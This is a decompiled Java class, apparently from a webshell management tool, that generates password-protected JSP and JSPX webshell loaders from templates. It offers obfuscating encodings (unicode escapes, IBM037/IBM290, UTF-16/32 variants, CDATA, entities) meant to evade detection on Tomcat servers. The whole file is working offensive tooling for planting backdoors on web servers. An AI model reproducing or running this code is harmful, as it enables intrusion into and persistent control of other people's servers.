/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.cryptions.JavaRSA;

import core.ApplicationContext;
import core.ui.component.dialog.GOptionPane;
import java.io.InputStream;
import shells.encoder.java.jspencounter;
import util.Log;
import util.functions;

class Generate {
    private static final String[] SUFFIX = new String[]{"jsp", "jspx"};

    Generate() {
    }

    public static byte[] GenerateShellLoder(String shellName, String pass, String secretKey, boolean isBin) throws Exception {
        byte[] data = null;
        String temp_suffix = "";
        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + "rawGlobalCode.bin");
            String globalCode = new String(functions.readInputStream(inputStream));
            inputStream.close();
            globalCode = globalCode.replace("{pass}", pass).replace("{secretKey}", secretKey);
            inputStream = Generate.class.getResourceAsStream("template/" + shellName + "rawCode.bin");
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            Object selectedValue = GOptionPane.showInputDialog(null, "suffix", "selected suffix", 1, null, SUFFIX, null);
            if (selectedValue != null) {
                String suffix;
                temp_suffix = suffix = (String)selectedValue;
                if (suffix.contains("tomcat_jsp_") || suffix.contains("jsp_")) {
                    suffix = "jsp";
                } else if (suffix.contains("jspx")) {
                    suffix = "jspx";
                }
                inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
                String template = new String(functions.readInputStream(inputStream));
                inputStream.close();
                if (suffix.contains("jspx")) {
                    globalCode = globalCode.replace("<", "&lt;").replace(">", "&gt;");
                    code = code.replace("<", "&lt;").replace(">", "&gt;");
                }
                template = ApplicationContext.isGodMode() ? template.replace("{globalCode}", functions.stringToUnicode(globalCode)).replace("{code}", functions.stringToUnicode(code)) : (temp_suffix == "jsp_unicode" || temp_suffix == "jspx_unicode" ? template.replace("{globalCode}", functions.stringToUnicode(globalCode)).replace("{code}", functions.stringToUnicode(code)) : template.replace("{globalCode}", globalCode).replace("{code}", code));
                data = template.getBytes();
            }
        } catch (Exception e) {
            Log.error(e);
        }
        if (temp_suffix != "") {
            switch (temp_suffix) {
                case "tomcat_jsp_IBM037": {
                    data = jspencounter.tomcat_jsp_IBM037(data);
                    break;
                }
                case "tomcat_jsp_IBM290": {
                    data = jspencounter.tomcat_jsp_IBM290(data);
                    break;
                }
                case "tomcat_jsp_UTF_16BE": {
                    data = jspencounter.tomcat_jsp_UTF_16BE(data);
                    break;
                }
                case "tomcat_jsp_UTF_16LE": {
                    data = jspencounter.tomcat_jsp_UTF_16LE(data);
                    break;
                }
                case "tomcat_jsp_UTF_32BE": {
                    data = jspencounter.tomcat_jsp_UTF_32BE(data);
                    break;
                }
                case "tomcat_jsp_UTF_32LE": {
                    data = jspencounter.tomcat_jsp_UTF_32LE(data);
                    break;
                }
                case "jsp_cdata": {
                    data = jspencounter.jsp_cdata(data);
                    break;
                }
                case "jsp_entity": {
                    data = jspencounter.jsp_entity(data);
                }
            }
        }
        return data;
    }

    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) throws Exception {
        return Generate.GenerateShellLoder("", pass, secretKey, isBin);
    }
}

